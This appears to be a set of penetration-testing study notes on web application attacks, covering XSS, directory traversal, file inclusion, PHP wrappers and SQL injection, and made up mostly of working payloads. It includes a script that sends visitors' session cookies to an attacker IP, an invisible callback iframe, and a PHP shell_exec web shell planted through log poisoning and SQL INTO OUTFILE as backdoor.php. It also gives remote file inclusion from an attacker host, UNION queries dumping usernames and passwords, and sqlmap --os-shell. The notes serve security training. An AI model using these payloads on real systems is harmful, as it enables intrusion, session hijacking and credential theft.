# Web application attacks

Web applications often contain vulnerabilities due to a large attack surface reliant on multiple technologies, dependencies and configuration challenges. &#x20;

### Enumeration

Before attacking, attempt to discover the technologies in use

* Programming languages and frameworks
* Web server software
* Database software
* Server OS

To accomplish this task, we can use the following techniques to gather information

* Inspect URLs for extensions (php, jsp, do, html, etc.)
* Inspect page content using browser tools
* View response headers for additional information (using a proxy tool)
* Inspect site maps, robots.txt, etc.
* Attempt to locate administration consoles

### Common tools

* Dirb: web content scanner that uses wordlists to attempt to locate directories and pages
* Burp Suite: advanced proxy/web application assessment tool
* FoxyProxy: FireFox plugin that simplifies activating/deactivating Burp Suite
* Nikto: configurable web server scanner that tests for common vulnerabilities

### Admin Consoles

* First attempt to login using default username/password combinations
* Brute forcing the login may also be an option, but can be noisy and/or result in lockouts
* Burp Suite's intruder tool can be used to automate scoped brute force attempts

### Cross site scripting

Well-designed web pages typically sanitize user inputs to remove dangerous characters or strings.  Cross site scripting occurs when data is not sanitized and attackers are able to inject inputs that are subsequently displayed on the web page.

There are three variants of cross-site scripting:

* Stored - occurs when the injected payload is stored on the server.  The payload is subsequently displayed to anyone who visits the page.
  * Affects all users of the site
  * Often found in forum software, especially in comments sections or product reviews
* Reflected - occurs when injected payloads are placed into the page content through a form or link.  Reflected XSS only affects the person performing the action.
  * Only attacks the person submitting the request or viewing the link
  * Often occurs in search field and results, as well as anywhere user input is included in error messages
* DOM-Based - take place solely in a page's Document Object Model (DOM).
  * Occurs when a page's DOM is modified with user-controlled content

All three variants can result in session hijacking, redirects and script execution.

#### Detecting

Detection is accomplished through reviewing web pages for input fields and testing to determine if those fields accept unsanitized inputs. Commonly sanitized characters (useful for testing) include:

```
< > ' " { } ;
```

If the application does not remove these characters, it may be vulnerable to XSS.&#x20;

#### Basic example

* We discover a web page that includes a form for users to provide feedback
* Posting a test message of `hello " ; <>` results in no filtering of the input
* We then use a basic payload like "`<script>alert('xss')</script>`"
* After submitting, we receive a popup
* Because this user feedback is written to a database, this is a stored xss vulnerability and all users that visit the page will receive the popup

#### **Injecting content**

A more malicious version of this attacks includes injecting invisible iframes into a victims browser. &#x20;

```
<iframe SRC=”http://10.11.0.5/report” height= “0” width= “0”></iframe>
```

When the victim visits the infected page, their browser attempts to download the linked item and establishes a connection with the attacking machine (requires a netcat listener on port 80)

#### **Stealing cookies and session information**

Cross site scripting can also be used to steal cookies and session information from site visitors.&#x20;

```
<script> new Image().src=”http://10.11.0.5/cool.jpg?output=”+document.cookie; </script>
```

When a victim visits the page, their browser established a connection back to the attacking machine with an authenticated session id (listener required)

Once we have the session id, we can set it in our browser using a tool like Cookie-Editor, and browse to the page without providing credentials (assuming the cookie we captured was for an authenticated user).

### Directory Traversal

Directory traversal allows attackers to gain access to files that should not be accessible through a web application.  These attacks are _information disclosures_ and occur when attackers are able to manipulate file paths.

#### Detection

Directory traversal vulnerabilities are often identified through the presence of file extensions in URLs.&#x20;

```
10.14.2.55/menu.php?file=index.php
```

If the user input is not validated, we may be able to modify the file path using "../" or "..\\", and then attempting to access system files that should not be accessible through the web application.

```
Linux - /etc/passwd
Windows - c:\boot.ini
Windows - c:\windows\system32\drivers\etc\hosts
```

### File Inclusion

File inclusion vulnerabilities allow an attacker to include a file into the application's running code. Local file inclusions occur when a file is loaded from the same web server; whereas, remote file inclusions include a file loaded from an external source. These vulnerabilities are most commonly found in PHP applications.

#### Detection

File inclusions are identified in the same way as directory traversals--by identifying parameters and attempting to manipulate them.  If we locate URLs that include parameters, we should test for both vulnerabilities.

* For LFI we attempt to access system files `/../../windows/system32/drivers/etc/hosts`
* If successful, we can attempt to execute files already stored on the server. Obviously, this attack is far more effective if we can also upload files

{% hint style="info" %}
In PHP versions below 5.3, terminate the request with a null byte "(%00)"
{% endhint %}

#### Contaminating log files

Use netcat to connect to the target machine on port 80, then send the following command:

```
<?php echo '<pre>' . shell_exec($_GET[‘cmd’]) . '</pre>';?>
```

Although we receive a "Bad Request" in netcat, the command is stored in the server's logs.  Once logged, we can attempt command execution.

```
http://10.34.5.34/index.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
```

If successful, the successful ipconfig output will be returned

#### Remote File Inclusion

RFIs are less common than LFIs due to typical default server configuration restrictions.

```
http://10.34.5.34/index.php?file=http://attackerip/evil.txt
```

If successful, we can modify evil.txt with PHP similar to used in the log file example to gain remote code execution.

#### PHP wrappers

PhP provides several data wrappers that can be used to exploit directory traversal and LFI vulnerabilities. The data wrappers allows us to embed inline data into the URL in plaintext or Base64. **This can be used as an alterative when we cannot poison a local file with PHP code.**

* The wrapper begins with "data:", followed by the type of data "text/plain,". The contents of the data begin after the comma.
* Test: `http://ipaddress/menu.php?file=data:text/plain, hello world`
* If the test succeeds, we can attempt to use php to execute commands
  * `http://ipaddress/menu.php?file=data:text/plain,<?php echo shell exec("dir")?>`

### SQL injection

SQL injection is a common vulnerability that enables attackers to inject commands and interact with databases.  While typically exploited for data leakage, SQL vulnerabilities can also lead to server compromise.

#### Detection

The first step is to find input fields on the target site that likely interact with databases, such as login field, search fields, message threads, etc.  We can use a single quote (') to check for potential vulnerabilities.  Ideally, this will cause an error and we'll receive an indication from the server. &#x20;

#### Authentication bypass

In normal operation we expect  a login form to query the database, something like:

```
select * from users where name = 'admin' and password = 'password123';
```

We can manipulate the input to change how the command is processed by the database:

```
admin' or 1=1;#
admin' or 1=1 LIMIT 1;#
```

Which results in query modification:

```
select * from users where name = 'admin' or 1=1;#' and password = 'password123';
```

The introduction of the single quote before the password entry removes the remainder of the statement. If  this causes errors, we can also request a fixed number of returns using the LIMIT statement.

```
select * from users where name = 'admin' or 1=1 LIMIT 1;#
```

To replicate in a web application, we submit the following payload into a username field:

```
tom' or 1=1 LIMIT 1;#
```

This should result in a authenticated session login.

#### Enumerating Databases

```
http://10.14.1.23/test.php?id=1' - begin testing with single quote
http://10.14.1.23/test.php?id=1 order by 1 - attempt to sort by first column
```

If this is successful and we receive the name of column, we can continue to increase the number until we receive an error.  This can be performed manually or automated in BurpSuite Repeater.

Next we can extract row information using the UNION statement.

```
http://10.14.1.23/test.php?id=1 union all select 1, 2, 3, 4
```

Depending on how the information is displayed, we can then modify our input to extract more information.  In the following example we've identified that the column three falls in a logical spot on the page.

```
http://10.14.1.23/test.php?id=1 union all select 1, 2, @@version
http://10.14.1.23/test.php?id=1 union all select 1, 2, user()
http://10.14.1.23/test.php?id=1 union all select 1, 2, table_name from information_schema.tables
http://10.14.1.23/test.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
http://10.14.1.23/test.php?id=1 union all select 1, username, password from users
```

#### Code Execution

In some cases we can use SQL injection to read/write system files and possibly write PHP onto the system for execution.

```
http://10.14.1.23/test.php?id=1 union all select 1, 2, load_file('C://Windows/System32/drivers/etc/hosts')
```

If this is successful we can attempt to create a malicious file on the server.

```
http://10.14.1.23/test.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```

We may then be able to access the file with a command.

```
http://10.14.1.23/backdoor.php?cmd=id
```

If this succeeds, we can expand access by installing a full php shell on the server.

#### SQLmap

Tools such as SQLmap simplify the extraction of information from databases.&#x20;

```
sqlmap -u http://10.14.1.23/test.php?id=1 -p "id"
sqlmap -u http://10.14.1.23/test.php?id=1 -p "id" --dbms=mysql --dump
```

SQLmap also has numerous other features including firewall bypass and attempting to gain a shell on the target system.

```
sqlmap -u http://10.14.1.23/test.php?id=1 -p "id" --dbms=mysql --os-shell
```
